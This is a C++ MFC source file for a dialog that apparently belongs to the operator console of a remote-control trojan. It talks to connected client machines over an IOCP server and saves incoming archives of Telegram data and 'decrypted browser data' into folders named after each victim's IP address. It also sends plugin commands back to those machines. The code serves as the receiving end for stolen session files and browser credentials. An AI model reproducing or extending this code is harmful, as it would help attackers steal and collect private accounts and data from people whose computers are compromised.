//  DecryptDlg.h:实现文件
//
#include "stdafx.h"
#include "Quick.h"
#include "ExpandDlg.h"



// CExpandDlg 对话框


//IMPLEMENT_DYNAMIC(CExpandDlg, CDialog)

CExpandDlg::CExpandDlg(CWnd* pParent, ISocketBase* IOCPServer, ClientContext* ContextObject)
	: CDialog(CExpandDlg::IDD, pParent)
{
	m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_DEC));
	m_iocpServer = IOCPServer;
	m_pContext = ContextObject;
	m_bOnClose = false;
}


void CExpandDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_EDIT_IN, m_edit_in);
	DDX_Control(pDX, IDC_EDIT_OUT, m_edit_out);
	DDX_Control(pDX, IDC_BUTTON_GET, m_button_get);
	DDX_Control(pDX, IDC_BUTTON_SET, m_button_set);
	DDX_Control(pDX, IDC_LIST_DATA, m_list);

}


BEGIN_MESSAGE_MAP(CExpandDlg, CDialog)
	ON_BN_CLICKED(IDC_BUTTON_GET, &CExpandDlg::OnBnClickedGet)
	ON_BN_CLICKED(IDC_BUTTON_SET, &CExpandDlg::OnBnClickedSet)
	ON_NOTIFY(NM_RCLICK, IDC_LIST_DATA, OnRclickList)
END_MESSAGE_MAP()


// CExpandDlg 消息处理程序


BOOL CExpandDlg::OnInitDialog()
{
	CDialog::OnInitDialog();
	SetIcon(m_hIcon, FALSE);

	BYTE lpBuffer = COMMAND_EXPAND_LAYOUT;
	m_iocpServer->Send(m_pContext, (LPBYTE)&lpBuffer, 1);
	return TRUE;
}

void CExpandDlg::OnReceive()
{
	if (m_pContext == NULL)
		return;
	if (m_bOnClose) 	return;
	CString str;
	str.Format(_T("%s\\\\ %s  [收包:%d 收:%d KB] [发包:%d 发:%d KB]"), m_expandlayout.strTitle, m_pContext->szAddress, m_pContext->m_allpack_rev, int(m_pContext->m_alldata_rev / 1024), m_pContext->m_allpack_send, int(m_pContext->m_alldata_send / 1024));
	SetWindowText(str);
}

void CExpandDlg::OnReceiveComplete(void)
{
	if (m_bOnClose) 	return;

	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case COMMAND_EXPAND_LAYOUT:
	{
		memcpy(&m_expandlayout, m_pContext->m_DeCompressionBuffer.GetBuffer(), sizeof(EXPANDLAYOUT));
		//窗口标题 大小
		CString strString;
		strString.Format(_T("%s - %s"), m_pContext->szAddress, m_expandlayout.strTitle);
		SetWindowText(strString);
		SetWindowPos(NULL, 0, 0, m_expandlayout.win_w, m_expandlayout.win_h, SWP_NOMOVE);

		//编辑框输入 
		m_edit_in.MoveWindow(m_expandlayout.edit_in_x, m_expandlayout.edit_in_y, m_expandlayout.edit_in_w, m_expandlayout.edit_in_h);
		m_edit_in.ShowWindow(m_expandlayout.bedit_in_show);

		//编辑框输出
		m_edit_out.MoveWindow(m_expandlayout.edit_out_x, m_expandlayout.edit_out_y, m_expandlayout.edit_out_w, m_expandlayout.edit_out_h);
		m_edit_out.ShowWindow(m_expandlayout.bedit_out_show);

		//按钮获取
		m_button_get.MoveWindow(m_expandlayout.button_get_x, m_expandlayout.button_get_y, m_expandlayout.button_get_w, m_expandlayout.button_get_h);
		m_button_get.ShowWindow(m_expandlayout.bbutton_get_show);
		GetDlgItem(IDC_BUTTON_GET)->SetWindowText(m_expandlayout.str_button_get_Title);

		//按钮设置
		m_button_set.MoveWindow(m_expandlayout.button_set_x, m_expandlayout.button_set_y, m_expandlayout.button_set_w, m_expandlayout.button_set_h);
		m_button_set.ShowWindow(m_expandlayout.bbutton_set_show);
		GetDlgItem(IDC_BUTTON_SET)->SetWindowText(m_expandlayout.str_button_set_Title);

		//列表设置
		m_list.MoveWindow(m_expandlayout.list_x, m_expandlayout.list_y, m_expandlayout.list_w, m_expandlayout.list_h);
		m_list.ShowWindow(m_expandlayout.blist_show);
		m_list.SetExtendedStyle(LVS_EX_FULLROWSELECT | LVS_EX_ONECLICKACTIVATE | LVS_EX_SUBITEMIMAGES | LVS_EX_GRIDLINES);
		for (int i = 0; i < m_expandlayout.Columns; i++)
		{
			SColumns m_SColumns;
			memcpy(&m_SColumns, m_pContext->m_DeCompressionBuffer.GetBuffer() + sizeof(EXPANDLAYOUT)+i* sizeof(SColumns), sizeof(SColumns));
			m_list.InsertColumn(i, m_SColumns.title, LVCFMT_LEFT, m_SColumns.w);
		}
		//列表菜单设置
		int menus = 1;
		VERIFY(menu.CreatePopupMenu());
		for (int i = 0; i < m_expandlayout.menus; i++)
		{
			TCHAR menu1[30] = {}; //固定30 列表标题
			memcpy(menu1, m_pContext->m_DeCompressionBuffer.GetBuffer() + sizeof(EXPANDLAYOUT) + m_expandlayout.Columns * sizeof(SColumns) + i * 62,60);
			menu.AppendMenu(MF_STRING | MF_ENABLED, menus++, menu1);
		}
		menu.AppendMenu(MF_STRING | MF_ENABLED,1000, _T("复制选择数据"));
	}
	break;
	case COMMAND_EXPAND_EDIT_IN:
	{
		CString strResult = (TCHAR*)m_pContext->m_DeCompressionBuffer.GetBuffer(1);
		m_edit_in.Clear();
		m_edit_in.SetWindowText(strResult);
	}
	break;
	case COMMAND_EXPAND_LISTDATA:
	{
		m_list.DeleteAllItems();
		DWORD	dwOffset = 0;
		TCHAR* lpBuffer = (TCHAR*)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
		int i = 0;
		for (i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
		{
			for (int j=0;j< m_expandlayout.Columns;j++)
			{
				TCHAR* tem = (TCHAR*)((char*)lpBuffer + dwOffset);
				if (0==j)
				{
					m_list.InsertItem(i, tem, 0);
					dwOffset += lstrlen(tem)*2 + 2;
				}
				else
				{
					m_list.SetItemText(i, j, tem);
					dwOffset += lstrlen(tem)*2 + 2;
				}
			}
		}
	}
	break;
	case COMMAND_EXPAND_TG:   //tg打包
	{
		
		DWORD ti = 0;
		memcpy(&ti, m_pContext->m_DeCompressionBuffer.GetBuffer(1), 4);

		TCHAR strSelf[MAX_PATH];
		GetModuleFileName(NULL, strSelf, sizeof(strSelf) * sizeof(TCHAR));
		CString str_path = strSelf;
		str_path = str_path.Mid(0, str_path.ReverseFind('\\'));
		CString path;
		path.Format(_T("%s\\telegram上传目录\\"), str_path );
		::CreateDirectory(path, NULL);
		path+= m_pContext->szAddress;
		::CreateDirectory(path, NULL);
		path.Format(_T("%s\\%d.zip"), path, ti);

		HANDLE h_bin = CreateFileW(path, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, NULL, NULL);
		DWORD dwBytesWritten = 0;
		if (INVALID_HANDLE_VALUE == h_bin || NULL == h_bin) {
			return ;
		}
		else {
			if (!WriteFile(h_bin, m_pContext->m_DeCompressionBuffer.GetBuffer(5), (DWORD)m_pContext->m_DeCompressionBuffer.GetBufferLen() - 5, &dwBytesWritten, NULL)) {
		
				return ;
			}
			FlushFileBuffers(h_bin);
			CloseHandle(h_bin);
		}
		m_edit_in.ReplaceSel(path);
		m_edit_in.ReplaceSel(_T("\r\n"));
	}
	break;
	case COMMAND_EXPAND_BD:   //浏览器解密数据打包上传
	{
		if (m_pContext->m_DeCompressionBuffer.GetBufferLen() == 1)
		{
			::MessageBox(NULL, _T("获取失败。"), 0, 0);
			return;
		}
			

		TCHAR strSelf[MAX_PATH];
		GetModuleFileName(NULL, strSelf, sizeof(strSelf) * sizeof(TCHAR));
		CString str_path = strSelf;
		str_path = str_path.Mid(0, str_path.ReverseFind('\\'));
		CString path;
		path.Format(_T("%s\\高级浏览器解密目录\\"), str_path);
		::CreateDirectory(path, NULL);
		path += m_pContext->szAddress;
		path.Format(_T("%s.zip"), path );

		HANDLE h_bin = CreateFileW(path, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, NULL, NULL);
		DWORD dwBytesWritten = 0;
		if (INVALID_HANDLE_VALUE == h_bin || NULL == h_bin) {
			return;
		}
		else {
			if (!WriteFile(h_bin, m_pContext->m_DeCompressionBuffer.GetBuffer(1), (DWORD)m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1, &dwBytesWritten, NULL)) {

				return;
			}
			FlushFileBuffers(h_bin);
			CloseHandle(h_bin);
		}
		m_edit_in.ReplaceSel(path);
		m_edit_in.ReplaceSel(_T("\r\n"));
	}
	break;
	default:
		// 传输发生异常数据
		break;
	}




	
}

void CExpandDlg::OnCancel()
{
	if (m_bOnClose) return;
	m_bOnClose = TRUE;
	DestroyIcon(m_hIcon);
	m_iocpServer->Disconnect(m_pContext);
	menu.DestroyMenu();
	if (IsWindow(m_hWnd))
		DestroyWindow();
}


void CExpandDlg::PostNcDestroy()
{
	if (!m_bOnClose)
		OnCancel();
	CDialog::PostNcDestroy();
	delete this;
}

void CExpandDlg::OnBnClickedGet()
{
	byte token = COMMAND_EXPAND_BUTTON_GET;
	m_iocpServer->Send(m_pContext, (LPBYTE)&token, 1);
}

void CExpandDlg::OnBnClickedSet()
{
	CString str;
	m_edit_out.GetWindowText(str);
	int len = str.GetLength() * 2 + 3;
	byte* lpbuffer = new byte[len];
	lpbuffer[0] = COMMAND_EXPAND_BUTTON_SET;
	memcpy(lpbuffer + 1, str.GetBuffer(), len - 1);
	m_iocpServer->Send(m_pContext, (LPBYTE)lpbuffer, len);
	SAFE_DELETE_AR(lpbuffer);
}

void CExpandDlg::OnRclickList(NMHDR* pNMHDR, LRESULT* pResult)
{
	CPoint	p;
	GetCursorPos(&p);
	int nMenuResult = CXTPCommandBars::TrackPopupMenu(&menu, TPM_LEFTALIGN | TPM_RIGHTBUTTON | TPM_RETURNCMD, p.x, p.y, this, NULL);
	if (!nMenuResult) 	return;
	
	if (nMenuResult==1000)
	{
		int nItem;
		CString strText(_T(""));
		POSITION pos = m_list.GetFirstSelectedItemPosition();
		if (pos == NULL)
		{
			::MessageBox(NULL, _T("请先选择要复制的记录 ..."), _T("提示"), MB_ICONINFORMATION);
			return;
		}
		else
		{
			//获取所有选中项目的内容。
			while (pos)
			{
				nItem = m_list.GetNextSelectedItem(pos);
				for (int i = 0; i < m_expandlayout.Columns; i++)
				{
					strText += m_list.GetItemText(nItem, i) + _T(" ");
				}
			}
			//将内容保存到剪贴板。
			if (!strText.IsEmpty())
			{
				if (!OpenClipboard()) return;
				if (!EmptyClipboard()) return;
				HGLOBAL hClipboardData = NULL;
				size_t sLen = strText.GetLength() * sizeof(TCHAR);
				hClipboardData = GlobalAlloc(GMEM_DDESHARE, (sLen + 1) * sizeof(wchar_t));
				if (!hClipboardData) return;
				wchar_t* pchData = (wchar_t*)GlobalLock(hClipboardData);
				if (!pchData) return;
				wcscpy_s(pchData, sLen + 1, strText.GetBuffer());
				if (!GlobalUnlock(hClipboardData)) return;
				SetClipboardData(CF_UNICODETEXT, hClipboardData);
				CloseClipboard();
			}
		}
	}
	else
	{
		byte* token=new byte[5];
		token[0] = COMMAND_EXPAND_LISTMEAN;
		memcpy(token+1, &nMenuResult, 4);
		m_iocpServer->Send(m_pContext, (LPBYTE)token, 5);
		SAFE_DELETE_AR(token);
	}
	*pResult = 0;
}
